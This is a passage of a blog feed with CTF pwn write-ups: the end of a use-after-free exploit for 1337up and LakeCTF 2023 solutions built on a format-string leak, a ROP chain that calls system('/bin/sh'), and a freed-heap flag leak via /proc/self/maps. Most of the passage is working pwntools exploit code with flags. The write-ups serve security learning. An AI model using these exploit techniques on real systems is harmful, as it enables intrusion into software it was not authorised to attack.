class="keyword">if</span> leak:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;is: &#x27;</span>)</span><br><span class="line">        heap = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;bio&gt;&#x27;</span>, new_bio)</span><br><span class="line">        <span class="keyword">return</span> heap</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;bio&gt;&#x27;</span>, new_bio)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_report</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;menu&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;title&gt;&#x27;</span>, <span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;report&gt;&#x27;</span>, <span class="string">b&#x27;bb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_reports</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;menu&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_balance</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;menu&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy_swag_pack</span>(): </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;menu&gt;&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># uaf</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>(): </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;menu&gt;&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_user(<span class="number">0xc0</span>, <span class="string">b&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">logout()        <span class="comment"># uaf</span></span><br><span class="line">new_report()    <span class="comment"># uaf ÌõÑ Ïû¨Ìï†Îãπ</span></span><br><span class="line">user = edit_user(<span class="string">b&#x27;BBBB&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">info(<span class="string">&#x27;user addr: &#x27;</span>+ <span class="built_in">hex</span>(user))</span><br><span class="line"></span><br><span class="line"><span class="comment"># user</span></span><br><span class="line"><span class="comment"># status A</span></span><br><span class="line"><span class="comment"># bounty 13337</span></span><br><span class="line"><span class="comment"># dummy 32</span></span><br><span class="line"><span class="comment"># dummy 128</span></span><br><span class="line"><span class="comment"># dummy </span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(user)</span><br><span class="line">payload += p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(<span class="number">13337</span>)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">127</span> <span class="comment"># 128ÌïòÎ©¥ 0xaÎì§Ïñ¥Í∞ÄÏÑú buy_sawg_packÏóêÏÑú ÌÑ∞Ïßê</span></span><br><span class="line">edit_user(payload)</span><br><span class="line"></span><br><span class="line">buy_swag_pack()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># INTIGRITI&#123;u53_4f73r_fr33_50und5_600d_70_m3&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> 1337up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2023 Write ups</title>
      <link href="/231106-lakectf2023-PWN/"/>
      <url>/231106-lakectf2023-PWN/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2069">https://ctftime.org/event/2069</a></li></ul><h2 id="Scream-Into-The-Abyss-90-solves-x2F-50-points"><a href="#Scream-Into-The-Abyss-90-solves-x2F-50-points" class="headerlink" title="Scream Into The Abyss (90 solves &#x2F; 50 points)"></a>Scream Into The Abyss (90 solves &#x2F; 50 points)</h2><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">save_msg</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> score)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *name; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  name = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">8uLL</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You can now scream a longer message but before you do so, we&#x27;ll take your name: &quot;</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  gets(name);       <span class="comment">// bof</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Saved score of %d for %s. Date and Time: &quot;</span>, score, name);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  system(<span class="string">&quot;date&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now please add a message: &quot;</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  gets(format);     <span class="comment">// bof</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your message:&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);   <span class="comment">// fsb</span></span><br><span class="line">  <span class="built_in">puts</span>(byte_20B8);</span><br><span class="line">  <span class="keyword">return</span> fflush(_bss_start);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There are many vulns.</p><p>I used name address to save ‚Äò&#x2F;bin&#x2F;sh‚Äô.</p><h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./abyss_scream&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;chall.polygl0ts.ch&#x27;</span>, <span class="number">9001</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./abyss_scream&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x13b5</span></span><br><span class="line">ret = <span class="number">0x0101a</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:&#x27;</span>, <span class="string">b&#x27;x&#x27;</span>) </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>) </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;message:&#x27;</span>, <span class="string">b&#x27;%41$p_%49$p&#x27;</span>) <span class="comment"># fsb, bof</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get name address and pie address using fsb</span></span><br><span class="line"><span class="comment"># name %41$p </span></span><br><span class="line"><span class="comment"># pie %49$p - 0x131e</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;message:\n&#x27;</span>)</span><br><span class="line">name,pie = p.recvline().strip().split(<span class="string">b&#x27;_&#x27;</span>)</span><br><span class="line">name = <span class="built_in">int</span>(name, <span class="number">16</span>)</span><br><span class="line">pie = <span class="built_in">int</span>(pie, <span class="number">16</span>) - <span class="number">0x131e</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(name))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie))</span><br><span class="line">e.address = pie</span><br><span class="line"></span><br><span class="line"><span class="comment"># call system() using bof</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:&#x27;</span>, <span class="string">b&#x27;x&#x27;</span>) </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>) </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">264</span> + <span class="number">8</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(e.address + pop_rdi)</span><br><span class="line">payload += p64(name)</span><br><span class="line">payload += p64(e.address + <span class="number">0x0101a</span>)</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;message:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># EPFL&#123;H3Y_C4LM_D0WN_N0_N33D_T0_SCR34M_S0_L0UD_1_C4N_H34R_Y0U!!!!!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="capture-the-flaaaaaaaaaaaaag-63-solves-x2F-50-points"><a href="#capture-the-flaaaaaaaaaaaaag-63-solves-x2F-50-points" class="headerlink" title="capture the flaaaaaaaaaaaaag (63 solves &#x2F; 50 points)"></a>capture the flaaaaaaaaaaaaag (63 solves &#x2F; 50 points)</h2><h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>There are all mitigations here. So I thought it would be as easy as just printing a flag, but it wasn‚Äôt.</p><p>Let‚Äôs dig into the code. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> ptr; <span class="comment">// [rsp+Bh] [rbp-15h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flaaaaaaaaaaaaag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;cannot fopen the flaaaaaaaaaaaaag&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !fread(&amp;ptr, <span class="number">1uLL</span>, <span class="number">1uLL</span>, stream) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;cannot fread the flaaaaaaaaaaaaag&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( fclose(stream) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;cannot fclose the flaaaaaaaaaaaaag&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;At polygl0ts we are very cool, so you get the first flaaaaaaaaaaaaag character for free : %c\n&quot;</span>,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)ptr);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Figure out the rest yourself !&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">4</span>; (<span class="type">int</span>)i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You have %d action(s) left\n&quot;</span>, i);</span><br><span class="line">    menu();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( feedback )</span><br><span class="line">    <span class="built_in">free</span>(feedback);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;no actions left :(&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>fread</code> internally calls <code>malloc</code> which will save the contents of the file. It has nothing to do with arguments of <code>fread</code>. After this, the heap memory is freed when <code>fclose</code> is called. This heap memory is only freed but not initialized, so its contents remain as is. It would be nice if I could reallocate this.</p><ul><li><code>malloc</code> at <code>&lt;_IO_doallocbuf+77&gt;</code> inside <code>fread</code> and <code>free</code> at <code>&lt;_IO_setb+84&gt;</code> inside <code>fclose</code>.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+4h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">char</span> *address[<span class="number">2</span>]; <span class="comment">// [rsp+8h] [rbp-48h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">26</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1 - read from file&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2 - read from memory&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3 - send feedback&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  choice = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d%*c&quot;</span>, &amp;choice);</span><br><span class="line">  <span class="keyword">switch</span> ( choice )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      *(_QWORD *)buf = <span class="number">0LL</span>;</span><br><span class="line">      *(_QWORD *)&amp;buf[<span class="number">8</span>] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;filename &gt; &quot;</span>);</span><br><span class="line">      size = read(<span class="built_in">stdin</span>-&gt;_fileno, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> )</span><br><span class="line">        buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        buf[size - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      stream = fopen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !stream )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;cannot fopen %s\n&quot;</span>, buf);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !fgets(&amp;buf[<span class="number">16</span>], <span class="number">16</span>, stream) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;cannot fgets %s\n&quot;</span>, buf);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( fclose(stream) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;cannot fclose %s\n&quot;</span>, buf);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(&amp;buf[<span class="number">16</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      address[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;address &gt; &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%zx&quot;</span>, address);</span><br><span class="line">      <span class="built_in">puts</span>(address[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      address[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( feedback )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sorry, but that&#x27;s enough criticism for today !&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;please share your thoughts with us&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        getline(&amp;feedback, &amp;n, <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;thank you !&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In case 1, I can open <code>/proc/self/maps</code>.</p><ul><li><code>/proc</code>: This directory contains information about processes and the system.</li><li><code>self</code>: It‚Äôs a symbolic link to the process ID directory of the current process. So, &#x2F;- proc&#x2F;self refers to the process-specific directory for the process that accesses it.</li><li><code>maps</code>: This file contains a list of memory mappings for the process.</li></ul><p>In case 2, I can print the address where the given address is stored. So, I‚Äôll get pie address using this.</p><p>In case 3, What is <code>getline</code>?<br>It calls <code>malloc</code> at <code>&lt;getdelim+110&gt;</code> inside <code>getline</code>. The heap address that was allocated when <code>fread</code> was called will be reallocated. And then, at <code>&lt;getdelim+248&gt;</code>, it receives a string from the keyboard and stores it in the heap. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Chunk(addr=0x555555559480, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [0x0000555555559480     66 61 6b 65 5f 66 6c 61 67 00 00 00 00 00 00 00    fake_flag.......]</span><br></pre></td></tr></table></figure><p>When I input one character like ‚ÄòA‚Äô with the keyboard, 3 bytes are input, including ‚Äò\n‚Äô and NULL. So When I print this address using case 2, I need to give <code>0x555555559480 + 3</code> as input.</p><h3 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./capture_the_flaaaaaaaaaaaaag&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.polygl0ts.ch&#x27;</span>, <span class="number">9003</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./capture_the_flaaaaaaaaaaaaag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call `malloc` inside `getline` </span></span><br><span class="line"><span class="comment"># the address that was allocated when `fread` was called is reallocated.</span></span><br><span class="line"><span class="comment"># global variable `feedback` -&gt; heap pointer -&gt; heap (where flag was stored)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak pie address</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline().strip().split(<span class="string">b&#x27;-&#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">feedback = e.address + <span class="number">0x4050</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(feedback))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the heap address stored in `feedback`.</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">hex</span>(feedback))</span><br><span class="line">heap = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># print the flag</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">hex</span>(heap+<span class="number">3</span>)) <span class="comment"># &#x27;A\n\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = p.recvline().strip().decode() </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;EPF&#x27;</span> + flag)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># EPFL&#123;why_h4ve_a_s1ngle_ch4r4ct3r_wh3n_fread_gives_you_7he_wh0l3_fl4g&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Lake </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Srdnlen CTF 2023 - PwnTube (fsb, rop)</title>
      <link href="/231105-srdnlen2023-pwntube/"/>
      <url>/231105-srdnlen2023-pwntube/</url>
      
